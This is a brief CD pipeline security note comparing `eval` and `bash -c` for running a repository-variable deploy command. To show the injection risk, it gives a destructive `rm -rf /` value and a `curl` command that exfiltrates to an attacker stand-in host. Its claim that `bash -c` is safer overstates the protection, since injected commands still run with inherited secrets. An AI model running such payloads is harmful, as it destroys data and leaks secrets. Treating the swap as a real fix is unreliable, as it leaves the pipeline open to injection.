# CD Pipeline Security Notes

## `eval` vs `bash -c` for Deploy Commands

### Previous Implementation (vulnerable)

The CD pipeline previously executed the deploy command using:

```yaml
run: eval "${DEPLOY_COMMAND}"
```

`eval` processes shell metacharacters, variable expansions, and command
substitutions in its argument string before executing. If the
`DEPLOY_COMMAND` repository variable were compromised or contained
unexpected shell syntax (e.g. `; rm -rf /` or `$(curl attacker.com/exfil)`),
`eval` would execute the injected payload in the current shell context with
full access to the environment (including secrets).

### Current Implementation (safer)

```yaml
run: bash -c "${DEPLOY_COMMAND}"
```

`bash -c` runs the command in a subprocess. While it still interprets the
string as a shell command, it provides a layer of isolation: the subprocess
does not inherit shell functions, aliases, or `set` options from the parent.
Combined with GitHub Actions' default `set -eo pipefail`, failures in the
subprocess are surfaced cleanly.

### Why `bash -c` is preferred

| Aspect              | `eval`                        | `bash -c`                          |
|---------------------|-------------------------------|------------------------------------|
| Execution context   | Current shell                 | Child process                      |
| Shell functions     | Inherited                     | Not inherited                      |
| Failure isolation   | Fails the current step        | Fails the subprocess               |
| Metachar expansion  | Full (dangerous)              | Full (but in isolated subprocess)  |

### Remaining recommendations

- Validate `DEPLOY_COMMAND` content in a prior step before execution.
- Consider moving to a dedicated deploy action or script instead of a
  freeform variable.
- Audit who has write access to repository variables regularly.
